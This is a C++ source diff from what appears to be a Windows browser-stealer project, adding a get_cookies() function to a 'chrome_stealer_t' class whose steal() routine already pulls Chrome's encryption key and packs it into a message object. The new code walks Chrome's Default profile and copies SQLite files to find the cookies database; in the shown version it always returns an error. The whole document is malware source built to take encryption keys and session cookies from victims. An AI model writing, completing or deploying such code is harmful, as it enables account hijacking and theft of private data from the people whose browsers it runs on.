@@ -3,13 +3,12 @@
 #include <filesystem>
 #include <fstream>
 #include <shlobj_core.h>
+#include <SQLiteCpp/SQLiteCpp.h>
 
 #include "net.h"
 
 #include "messages/text_message.h"
 #include "messages/error_message.h"
-
-namespace fs = std::filesystem;
 
 net::expected<fs::path> get_browser_path()
 {
@@ -48,6 +47,50 @@ net::expected<std::string> get_encryption_key(const fs::path& browser_path)
     return encryption_key;
 }
 
+net::expected<std::vector<net::cookie_t>> get_cookies(const fs::path& browser_path)
+{
+    const auto cookies_path = browser_path / "Default";
+    if(!fs::exists(cookies_path))
+        return net::error_t("Chrome(ERROR): cookies folder not found");
+
+    for (const auto& cookie_path : fs::recursive_directory_iterator(cookies_path))
+    {
+        if(!cookie_path.is_regular_file())
+            continue;
+
+        fs::path temp_cookie_file_path;
+        do
+        {
+            temp_cookie_file_path = fs::temp_directory_path()
+#ifndef _NDEBUG
+                / "test_cookies"
+#endif
+                / net::generate_random_string(15);
+        } while(fs::exists(temp_cookie_file_path));
+
+        fs::copy_file(cookie_path, temp_cookie_file_path);
+        FS_DEFER([&](...){
+            fs::remove(temp_cookie_file_path);
+        });
+
+        SQLite::Database db(temp_cookie_file_path);
+        try
+        {
+            if(!db.tableExists("cookies"))
+                continue;
+        } catch (std::exception& e)
+        {
+            continue;
+        }
+
+        DLOG(std::format("Chrome(DISPLAY): file with cookie {}", cookie_path.path().string()));
+
+        break;
+    }
+
+    return net::error_t("Chrome(ERROR): Cant get cookies for temporary path");
+}
+
 asio::awaitable<std::unique_ptr<message_t>> chrome_stealer_t::steal()
 {
         return asio::async_initiate<decltype(asio::use_awaitable), void(std::unique_ptr<message_t>&&)>(
@@ -59,6 +102,9 @@ asio::awaitable<std::unique_ptr<message_t>> chrome_stealer_t::steal()
 
                 FS_TRY_EXPECTED_OR_RETURN_ERROR_MESSAGE(std::string encryption_key, get_encryption_key(browser_path));
                 DLOG("Chrome(DISPLAY): Encryption key received");
+
+                FS_TRY_EXPECTED_OR_RETURN_ERROR_MESSAGE(auto cookies, get_cookies(browser_path));
+                DLOG("Chrome(DISPLAY): Cookies received");
 
                 auto text_msg = std::make_unique<text_message_t>();
                 text_msg->text = encryption_key;
